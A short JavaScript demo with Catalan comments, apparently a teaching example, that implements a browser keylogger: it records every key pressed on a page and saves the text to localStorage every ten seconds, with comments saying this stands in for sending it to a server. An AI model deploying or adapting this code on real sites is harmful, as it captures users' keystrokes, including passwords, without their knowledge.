// Variable on guardem el text escrit
var text = "";

// Apliquem el escoltador d'events
document.onkeydown = function(evt) {
    evt = evt || window.event; // Per IE
    text = text + evt.key;
};

// Enmagatzenar el text en el localstorage cada 10 segons
// Equivalent a enviar-ho al servidor per enmagatzenar-ho
// i netegem la variable
// Es pot consultar el text en el insoector del navegador
// Aplicación > localStorage
// o fent un localStorage.getItem("keylogger");
const intervalo = setInterval(() => {
    let textAnterior = localStorage.getItem("keylogger");
    if (textAnterior) text += textAnterior;
    localStorage.setItem("keylogger", text);
    text = "";
}, 10000);